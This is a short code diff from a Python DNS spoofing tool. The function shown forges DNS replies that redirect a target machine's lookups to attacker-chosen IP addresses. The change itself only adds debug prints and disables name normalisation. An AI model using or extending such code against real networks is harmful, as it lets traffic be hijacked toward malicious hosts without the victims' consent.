@@ -60,12 +60,14 @@ def make_response(pkt, spoof_ip):
 def handle_packet(pkt, hosts, target_ip):
     if not should_spoof(pkt, target_ip):
         return
+    print("should spoof")
     qname = pkt[DNSQR].qname.decode(errors="ignore").lower()
-    if not qname.endswith("."):
-        qname += "."
+    #if not qname.endswith("."):
+    #   qname += "."
     spoof_ip = hosts.get(qname)
     if not spoof_ip:
         return
+    print("got spoof ip")
     response = make_response(pkt, spoof_ip)
     print(f"[*] Spoofed {qname} -> {spoof_ip}")
     send(response, verbose=0)
